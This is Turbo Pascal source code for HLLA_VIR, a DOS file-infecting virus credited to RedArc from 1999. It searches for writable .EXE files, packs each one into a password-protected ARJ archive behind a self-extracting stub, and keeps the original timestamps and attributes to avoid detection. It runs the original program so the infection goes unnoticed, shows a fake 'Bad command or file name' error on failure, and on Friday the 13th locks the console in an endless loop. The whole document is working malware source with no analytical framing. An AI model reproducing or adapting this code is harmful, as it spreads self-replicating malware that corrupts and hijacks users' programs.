{$A-,B-,D-,E-,F-,G-,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 2048,10240,65536}
{1999 (c) by RedArc}
PROGRAM HLLA_VIR;

{$I-}

USES Dos, FileUtil;

TYPE
    TInfo = Record
          VirName  : String [12];
          GoatName : String [12];
          ArjName  : String [12];
          LZEName  : String [12];
          BegName  : String [12];
    End;

CONST
     ExeExt = '.EXE';
     InfExt = '.INF';
     BCOFN  = 'Bad command or file name';
     VirDir = '\HLLA';
     HLLA_T = '$HLLA$.EX$';

VAR
   SR    : SearchRec;
   FA    : Word;
   FT    : LongInt;
   Home  : String;
   FName : String;
   RName : String;
   R1Name : String;
   BName : String;
   Param : String;
   I, J  : Word;
   FI    : File Of TInfo;
   Info  : TInfo;
   MyDir : String;
   Dir   : DirStr;
   Nam   : NameStr;
   Ext   : ExtStr;
   Password : String [12];

PROCEDURE Infect;
VAR
   FIName : String [12];
   F, F1 : File;
   PasswordN : Array [1..12] of Char;
   P : Pointer;
BEGIN
     Assign (F, SR.Name);
     ReSet (F, 1);
     if IOResult <> 0 then Exit;
     if FileSize (F) > 200 * 1024 then begin
        Close (F);
        Exit;
     end;
     Close (F);
     RName  := Info.ArjName;
     R1Name := Info.LZEName;
     BName  := Info.BegName;
     with Info do begin
          VirName  := RandomName;
          GoatName := RandomName;
          ArjName  := RandomName;
          LZEName  := RandomName;
          BegName  := RandomName;
     end;
     if CopyFile (Home + '\' + SR.Name, MyDir + '\' + Info.GoatName, False) then Exit;
     if CopyFile (MyDir + '\' + FName, MyDir + '\' + Info.VirName, True) then Exit;
     FName := Info.VirName;
     if CopyFile (MyDir + '\' + RName, MyDir + '\' + Info.ArjName, True) then Exit;
     RName := Info.ArjName;
     if CopyFile (MyDir + '\' + R1Name, MyDir + '\' + Info.LZEName, True) then Exit;
     R1Name := Info.ArjName;
     if CopyFile (MyDir + '\' + BName, MyDir + '\' + Info.BegName, True) then Exit;
     BName := Info.BegName;
     ChDir (MyDir);
     if IOResult <> 0 then Exit;
     FSplit (Info.VirName, Dir, Nam, Ext);
     FIName := Nam + InfExt;
     Assign (FI, FIName);
     ReWrite (FI);
     if IOResult <> 0 then Exit;
     Write (FI, Info);
     Close (FI);
     Password := RandomName;
     for I := 1 to 12 do
         PasswordN[I] := Password[I];
     ProgramExecute (Info.ArjName, 'a -y -je -g' + Password + ' ' + SR.Name);
     Erase (FI);
     Assign (F, Info.GoatName);
     SetFAttr (F, Archive);
     Erase (F);
     Assign (F, Home + '\' + SR.Name);
     GetFAttr (F, FA);
     ReSet (F,1);
     GetFTime (F, FT);
     Close (F);
     SetFAttr (F, Archive);
     Erase (F);
     {}
     Assign (F, Info.BegName);
     ReSet (F, 1);
     FileMode := 2;
     Seek (F, $42b);
     BlockWrite (F, PasswordN, 12, I);
     Seek (F, $439);
     for I := 1 to 12 do
         PasswordN[I] := Info.VirName[I];
     BlockWrite (F, PasswordN, 12, I);
     Close (F);
     ProgramExecute (Info.LZEName, Info.BegName);
     Assign (F, Info.BegName);
     ReSet (F, 1);
     FileMode := 2;
     Seek (F, FileSize (F));
     Assign (F1, SR.Name);
     ReSet (F1, 1);
     GetMem (P, 1024 * 5);
     repeat
           BlockRead (F1, P^, 1024 * 5, I);
           BlockWrite (F, P^, I, J);
     until (I <> 1024 * 5) or (I <> J);
     FreeMem (P, 1024 * 5);
     Close (F1);
     Close (F);
     Erase (F1);
     Rename (F, SR.Name);
     FSplit (Info.BegName, Dir, Nam, Ext);
     Assign (F, Nam + '.OLD');
     Rename (F, Info.BegName);
     {}
     Assign (F, SR.Name);
     ReSet (F);
     SetFTime (F, FT);
     Close (F);
     SetFAttr (F, FA+ReadOnly);
     if CopyFile (MyDir + '\' + SR.Name, Home + '\' + SR.Name, True) then begin
        Assign (FI, SR.Name);
        SetFAttr (FI, Archive);
        Erase (FI);
     end;
     if IOResult <> 0 then ;
     ChDir (Home);
END;

PROCEDURE FindGoat (FMask : String);
VAR
   F  : File;
BEGIN
     FindFirst ('*'+FMask, Archive, SR);
     while DOSError = 0 do begin
           Assign (F, SR.Name);
           GetFAttr (F, FA);
           if (FA and ReadOnly = 0) then
              Infect;
           FindNext (SR);
     end;
END;

FUNCTION ExecuteBoss : Boolean;
BEGIN
     FSplit (FName, Dir, Nam, Ext);
     Assign (FI, Home + '\' + Nam + InfExt);
     ReSet (FI);
     if IOResult <> 0 then begin
        WriteLn (BCOFN);
        ExecuteBoss := True;
        Exit;
     end;
     Read (FI, Info);
     if IOResult <> 0 then begin
        WriteLn (BCOFN);
        Close (FI);
        ExecuteBoss := True;
        Exit;
     end;
     Close (FI);
     Erase (FI);
     If IOResult <> 0 then ;
     MyDir := Home + VirDir;
     MkDir (MyDir);
     if IOResult <> 0 then begin
        ExecuteBoss := True;
        Exit;
     end;
     with Info do begin
          if CopyFile (Home + '\' + VirName, MyDir + '\' + VirName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + ArjName, MyDir + '\' + ArjName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + BegName, MyDir + '\' + BegName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + LZEName, MyDir + '\' + LZEName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (RName, Home + '\' + HLLA_T, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + GoatName, RName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
     end;
     ProgramExecute (RName, Param);
     Assign (FI, RName);
     SetFAttr (FI, Archive);
     Erase (FI);
     if CopyFile (Home + '\' + HLLA_T, RName, True) then begin
        ExecuteBoss := True;
        Exit;
     end;
     ExecuteBoss := False;
END;

PROCEDURE Effect;
VAR
   Y, M, D, Dof : Word;
BEGIN
     GetDate (Y, M, D, Dof);
     if (Dof = 5) and (D = 13) then begin
        SetCBreak (False);
        repeat
              WriteLn ('Kirgudu!');
        until False;
     end;
END;

BEGIN
     GetDir (0, Home);
     FName := ParamStr (0);
     FSplit (FName, Dir, Nam, Ext);
     FName := Nam + Ext;
     RName := ParamStr (1);
     Assign (FI, '$$$$$$$$.EXE');
     Erase (FI);
     if IOResult <> 0 then ;
     Param := '';
     for I := 2 to ParamCount do
         Param := Param + ParamStr (I) + ' ';
     while Param [Length (Param)] = ' ' do Dec (Byte (Param [0]));
     if ExecuteBoss then Exit;
     FindGoat (ExeExt);
     ChDir (MyDir);
     FindFirst ('*.*', AnyFile, SR);
     while DOSError = 0 do begin
           if ((SR.Attr and VolumeID) = 0) and ((SR.Attr and Directory) = 0) then begin
              Assign (FI, SR.Name);
              SetFAttr (FI, Archive);
              Erase (FI);
           end;
           FindNext (SR);
     end;
     ChDir (Home);
     RmDir (MyDir);
     Effect;
END.
